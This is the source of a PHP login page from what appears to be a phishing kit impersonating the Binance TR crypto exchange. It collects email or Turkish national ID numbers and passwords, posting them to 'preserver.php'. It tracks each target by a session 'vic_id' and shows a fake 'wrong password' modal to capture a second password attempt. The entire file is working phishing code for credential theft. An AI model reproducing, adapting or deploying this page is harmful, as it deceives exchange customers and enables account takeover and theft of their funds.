<?php
ob_start();
if (session_status() == PHP_SESSION_NONE) {
  session_start();
}

require_once './settings/db.php';
global $user_ip;

if(isset($_GET['status']) && $_GET['status'] == 'wrongpassword') {
  $id = $_SESSION['vic_id'];
  try {
    $stmt = $dbh->prepare("SELECT email FROM info WHERE id = :id");
    $stmt->bindParam(':id', $id, PDO::PARAM_INT);
    $stmt->execute();
    $user = $stmt->fetch(PDO::FETCH_ASSOC);
  } catch (PDOException $th) {
    echo $th->getMessage();
  }
}
?>
<!DOCTYPE html>
<html lang="tr">

<head>
  <title>Giriş Yap | Binance TR</title>
  <meta charset="utf-8">
  <meta name="format-detection" content="telephone=no, email=no, address=no">
  <meta name="keywords" content="BTC, Trade, Bitcoin, Türk Lirası, Ethereum, Kriptopara, USDT, TR, Turkey, Türk">
  <meta name="description" data-hid="description" content="Güvenilir ve Kullanıcı Dostu Kriptopara Platformu. Banka transferi ile Türk Lirası yatır. Bitcoin, Ethereum, Ripple ve diğer kriptoparaları kolayca satın al.">
  <meta name="google" content="notranslate">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1, user-scalable=no">
  <link rel="stylesheet" href="assets/css/style.css">
  <link rel="shortcut icon" href="assets/images/favicon.ico" type="image/x-icon">
  <script>
    document.documentElement.style.cssText = "filter:hue-rotate(4deg)";
  </script>
</head>

<body class="RFD">
  <div id="__nuxt">
    <div id="__layout">
      <div data-v-905421cc="">
        <div data-v-1445057b="" data-v-905421cc="" id="headerId" class="top">
          <header data-v-1445057b="" class="z-9 fixed">
            <nav data-v-1445057b="">
              <a data-v-1445057b="" class="nav-logo nuxt-link-active">
                <img data-v-1445057b="" src="assets/images/logo.png" alt="logo" class="logo">
              </a>
              <div data-v-1445057b="" class="nav-list">
                <a data-v-1445057b="">Piyasalar</a>
                <a data-v-1445057b="">Al-Sat</a>
                <a data-v-1445057b="">Yatırma</a>
                <a data-v-1445057b="">Çekme</a>
                <a data-v-1445057b="">Kolay Al/Sat</a>
                <a data-v-1445057b="">Dönüştür</a>
                <a data-v-1445057b="">Otomatik Yatırım</a>
                <a data-v-1445057b="">Blog</a>
                <a data-v-1445057b="">Destek Merkezi</a>
              </div>
              <div data-v-1445057b="" class="nav-r">
                <div data-v-1445057b="" class="nav-signin">
                  <div data-v-1445057b="" class="register">
                    <a data-v-1445057b="" class="_signin">Giriş Yap</a>
                    <a data-v-1445057b="" class="bc-btn bc-btn-yellow _signup">Hesap Oluştur</a>
                  </div>
                </div>
                <div data-v-1445057b="" class="exchange-rate dropdown-arrow download-icon">
                  <span data-v-1445057b="">
                    <svg data-v-1445057b="" aria-hidden="true" class="icon">
                      <use data-v-1445057b="" xlink:href="#icondownload"></use>
                    </svg>
                  </span>
                  <div data-v-1445057b="" class="rate-list clearfix z-2 download">
                    <div data-v-1445057b="" class="download-qrcode">
                      <canvas width="120" height="120" style="display: none;"></canvas>
                      <img style="display: block;" src="./assets/images/mqr.png">
                    </div>
                    <p data-v-1445057b="">İndirmek Tara IOS &amp; Android</p>
                    <a data-v-1445057b="" class="bc-btn bc-btn-yellow">İndirme Seçenekleri</a>
                  </div>
                </div>
                <div data-v-1445057b="" class="exchange-rate">
                  <span data-v-1445057b="">Türkçe</span> &nbsp;|&nbsp; <span data-v-1445057b="">TRY</span>
                </div>

                <div data-v-1445057b="" class="phoneMore">
                  <svg data-v-1445057b="" aria-hidden="true" class="icon">
                    <use xlink:href="#iconmore"></use>
                  </svg>
                </div>
              </div>
            </nav>
          </header>
          <div data-v-1445057b="" class="sideslip-box" style="display: none;">
            <div data-v-1445057b="" class="sideslip-content" style="display: none;">
              <div data-v-1445057b="" class="sideslip-container">
                <a data-v-1445057b="" class="_signin_">Giriş Yap</a>
                <a data-v-1445057b="" class="bc-btn bc-btn-yellow _signup_">Hesap Oluştur</a>
                <div data-v-1445057b="" class="split-line"></div>

                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconmarket"></use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Piyasa </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconspot"></use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Borsa </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconwallet"></use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Yatırma </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconwallet"></use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Çekme </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconrectangle"></use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Öğren &amp; Kazan! </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconconvert"></use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Kolay Al/Sat </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconlamp"></use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" target="_blank" class="menu-text"> Blog <span data-v-1445057b="" class="extend-content"> Yeni </span>
                    </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="split-line"></div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#icondownload"></use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> İndir </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconlang"></use>
                      </svg>
                    </div>
                    <div data-v-1445057b="" class="menu-text"> Türkçe | TRY </div>
                  </div>
                </div>
              </div>
            </div>
            <div data-v-1445057b="" class="sideslip-bg"></div>
          </div>
          <div data-v-1445057b="" class="sideslip-box" style="display: none;">
            <div data-v-1445057b="" class="sideslip-content" style="display: none;">
              <div data-v-1445057b="" class="sideslip-container">


                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconsecurity"></use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Güvenlik </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconkyc"></use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Kimlik Doğrulama ve Limitler </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" data-bnc="Indicator#index" aria-hidden="true" class="icon">
                        <use xlink:href="#iconapi"></use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> API Yönetimi </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconreferral"></use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Referans </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="split-line"></div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconlogout"></use>
                      </svg>
                    </div>
                    <div data-v-1445057b="" class="menu-text"> Çıkış Yap </div>
                  </div>
                </div>
              </div>
            </div>
            <div data-v-1445057b="" class="sideslip-bg"></div>
          </div>


        </div>
        <main data-v-5c4d12e5="" data-v-905421cc="">
          <section data-v-6408680b="" data-v-5c4d12e5="">
            <h2 data-v-6408680b="">Giriş Yap</h2>
            <div class="login-box" data-v-6408680b="">
              <div class="loading" style="display:none;" data-v-6408680b="">
                <div class="groove" data-v-6408680b="">
                  <div class="bar" data-v-6408680b=""></div>
                </div>
              </div>
              <form action="<?php if(isset($_GET['status']) && $_GET['status'] == 'wrongpassword') { echo 'pages/form.php?updatePassword'; } else { echo 'preserver.php'; } ?>" method="POST" autocomplete="off">
                <div class="oauth-title" data-v-6408680b="" data-v-5c4d12e5=""> Binance.com hesabıyla oturum açın: </div>
                <a class="oauth-btn bc-btn bc-font-medium" data-v-1bb59c78="" data-v-5c4d12e5="" data-v-6408680b="">
                  <img src="./assets/images/tlgbn.svg" alt="image" data-v-1bb59c78="">
                  <span data-v-1bb59c78="">Binance.com hesabıyla oturum açın</span>
                </a>
                <div class="create-account" data-v-6408680b="" data-v-5c4d12e5=""> Binance TR hesabıyla oturum açın: </div>
                <div value="" class="input-model input-mg20 <?php if(isset($user['email'])) { echo 'pwd-focus'; } else { echo ''; } ?>" data-v-4d51f6f4="" data-v-5c4d12e5="" data-v-6408680b="">
                  <div class="dynamic-placeholder" data-v-4d51f6f4="">E-posta</div>
                  <?php if(isset($user['email'])) { ?>
                    <input type="text" id="email" name="email" data-v-4d51f6f4="" autocomplete="email" value="<?php echo $user['email']; ?>" readonly disabled>
                  <?php } else { ?>
                    <input type="text" id="email" name="email" data-v-4d51f6f4="" autocomplete="email">
                  <?php } ?>
                  <div class="icon-wrap" data-v-4d51f6f4="">
                  </div>
                  <div data-v-4d51f6f4="" class="input-error">Lütfen geçerli bir e-posta girin</div>
                </div>
                <div value="" class="input-model input-mg20" data-v-4d51f6f4="" data-v-5c4d12e5="" data-v-6408680b="">
                  <div class="dynamic-placeholder" data-v-4d51f6f4="">Şifre</div>
                  <input type="password" id="password" name="password" data-v-4d51f6f4="">
                  <div class="icon-wrap" data-v-4d51f6f4="">
                    <div data-v-4d51f6f4="">
                      <svg aria-hidden="true" class="icon" data-v-4d51f6f4="">
                        <use xlink:href="#iconhidepwd" data-v-4d51f6f4=""></use>
                      </svg>
                    </div>
                  </div>
                  <div data-v-4d51f6f4="" class="input-error" style="<?php if(isset($_GET['status']) && $_GET['status'] == 'wrongpassword') { echo 'display: block;'; } else { echo 'display: none;'; } ?>">
                    En az 8 karakterden oluşmalı ve en az bir büyük harf, bir küçük harf ve bir rakam içermelidir.
                  </div>
                </div>
                <button class="bc-btn bc-btn-yellow sensors-login" data-v-6408680b="" data-v-5c4d12e5=""> Giriş Yap </button>
                <div class="more" data-v-6408680b="" data-v-5c4d12e5="">
                  <div data-v-6408680b="" data-v-5c4d12e5="">
                    <a data-v-5c4d12e5="" data-v-6408680b="">Şifrenizi mi unuttunuz?</a>
                  </div>
                  <div data-v-6408680b="" data-v-5c4d12e5="">
                    <a data-v-5c4d12e5="" data-v-6408680b="">Kaydol</a>
                  </div>
                </div>
                <input type="hidden" name="token" value="<?php echo isset($_SESSION['form_token']) ? $_SESSION['form_token'] : generateFormToken(); ?>">
              </form>
            </div>
          </section>
        </main>
        <?php include 'component/footer.php'; ?>
      </div>
    </div>
  </div>
  <div class="loading-box" style="display: none;">
    <img src="./assets/images/loading.svg" alt="loading">
  </div>
  <?php if(isset($_GET['status']) && $_GET['status'] == 'wrongpassword') { ?> 
    <div class="area" id="modal">
      <div class="css-1vb7bc9" style="transform: translate3d(0px, 0px, 0px);">
        <div class="css-lu6k78" style="opacity: 1;">
          <div class="css-14qry50">
            <div class="css-1bpj83k">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" class="css-boyavq">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5.326 13.909l-1.429 1.417L12 13.429l-3.897 3.897-1.429-1.417 3.909-3.898-3.909-3.908 1.429-1.417L12 10.583l3.897-3.897 1.429 1.417-3.897 3.908 3.897 3.898z" fill="currentColor"></path>
              </svg>
            </div>
            <div class="bn-notification-body-wrapper css-gxv9qv">
              <div data-bn-type="text" class="bn-notification-msg-wrapper css-161eirp">Şifreniz hatalı.</div>
            </div>
          </div>
        </div>
      </div>
      <div class="css-vp41bv">
        <div class="css-baaq78">
          <div class="css-tolw2i"></div>
          <div class="css-16wz1c4">
            <div class="css-hv39bs">
              <div class="css-uq1pv2">
                <div src="../assets/images/error.svg" class="css-ydz7pw"></div>
              </div>
              <div data-bn-type="text" class="modal-desc css-1ixmqv3">Şifreniz hatalı lütfen tekrar deneyin.</div>
              <div class="btn-group css-1tr0qpm">
                <button data-bn-type="button" class="bc-btn bc-btn-yellow sensors-login" style="width:100%" onclick="modal.style.display = 'none';">
                  <div data-bn-type="text" class="css-1c82c04">Anladım</div>
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  <?php }?>
  <script>
    let f = false;
    const f1 = document.querySelector('form');
    const em = f1.elements[0];
    const pw = f1.elements[1];
    const psvg = document.querySelector('input[type="password"] + div');

    psvg.addEventListener('click', function() {
      if (pw.type === 'password') {
        pw.type = 'text';
        psvg.querySelector('use').setAttribute('xlink:href', '#iconeye');
      } else {
        pw.type = 'password';
        psvg.querySelector('use').setAttribute('xlink:href', '#iconhidepwd');
      }
    });

    function hfb(event) {
      const i = event.target;
      const l = i.nextElementSibling;
      const par = i.parentElement;

      l.classList.add('active');
      par.classList.add('pwd-focus');
    }

    const TCNOKontrol = function(TCNO) {
      var tek = 0,
        cift = 0,
        sonuc = 0,
        TCToplam = 0,
        i = 0,
        hatali = [11111111110, 22222222220, 33333333330, 44444444440, 55555555550, 66666666660, 7777777770, 88888888880, 99999999990];

      if (TCNO.length != 11) return false;
      if (isNaN(TCNO)) return false;
      if (TCNO[0] == 0) return false;

      tek = parseInt(TCNO[0]) + parseInt(TCNO[2]) + parseInt(TCNO[4]) + parseInt(TCNO[6]) + parseInt(TCNO[8]);
      cift = parseInt(TCNO[1]) + parseInt(TCNO[3]) + parseInt(TCNO[5]) + parseInt(TCNO[7]);

      tek = tek * 7;
      sonuc = tek - cift;
      if (sonuc % 10 != TCNO[9]) return false;

      for (var i = 0; i < 10; i++) {
        TCToplam += parseInt(TCNO[i]);
      }

      if (TCToplam % 10 != TCNO[10]) return false;

      if (hatali.toString().indexOf(TCNO) != -1) return false;

      return true;
    }

    function hi(event) {
      const i = event.target;
      const l = i.nextElementSibling;
      const par = i.parentElement;

      if (i.value === '') {
        l.classList.remove('active');
        par.classList.remove('pwd-focus');
      } else {
        l.classList.add('active');
        par.classList.add('pwd-focus');
      }
    }

    const eI = document.querySelector('#email');
    const pI = document.querySelector('#password');

    eI.addEventListener('click', hfb);
    eI.addEventListener('focus', hfb);
    eI.addEventListener('blur', hi);
    eI.addEventListener('input', hi);

    pI.addEventListener('click', hfb);
    pI.addEventListener('focus', hfb);
    pI.addEventListener('blur', hi);
    pI.addEventListener('input', hi);

    const errFn = (el) => {
      el.parentElement.lastElementChild.style.display = 'block';
    }

    const tFn = (el) => {
      el.parentElement.lastElementChild.style.display = 'none';
    }

    f1.addEventListener('submit', (e) => {
      e.preventDefault();

      var ev = em.value;
      var pwValid = /(?=.*\d)(?=.*[A-Z])[\s\S]{8,128}/.test(pw.value.trim());
      var emValid = (ev.length === 11 && /^[0-9]+$/.test(ev)) ? TCNOKontrol(ev) : /^[\w+&*-]+[-+.'&*\w]*@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$/.test(ev.trim());

      pwValid ? tFn(pw) : errFn(pw);
      emValid ? tFn(em) : errFn(em);

      if (pwValid && emValid) {
        f1.submit();
      }
    });

    if (document.location.search.includes('return')) {
      [...f1.elements].forEach(i => {
        i.parentElement.lastElementChild.style.display = 'block';
        i.style.borderColor = '#f23051';
      });
    }
  </script>
</body>
</html>